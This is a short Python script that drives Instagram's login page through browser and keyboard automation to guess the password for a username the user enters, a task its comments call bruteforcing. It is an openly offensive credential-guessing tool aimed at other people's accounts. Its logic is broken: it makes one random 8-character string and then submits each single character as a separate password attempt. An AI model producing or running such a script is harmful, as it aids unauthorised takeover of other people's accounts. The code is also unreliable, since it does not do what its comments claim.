from webbot import Browser
from pynput.keyboard import Key, Controller
import time
from random import choice
import string

username = input('Username: ')

## control variables
web = Browser()
keyboard = Controller()

values = string.ascii_letters + string.digits ## + string.punctuation // just in last cases
size = 8

senha = [] ### the return

                        ### when the size it's over, the loop ends
for i in range(size):
    senha += choice(values)

web.go_to('www.instagram.com')
                        ### running bruteforce
time.sleep(5)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
time.sleep(5)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
time.sleep(5)
web.type(username)
keyboard.press(Key.tab)
keyboard.release(Key.tab)

for brute in senha:
    web.type(brute, into="Password")
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    print ("Trying sign in:",senha)
    time.sleep(5)

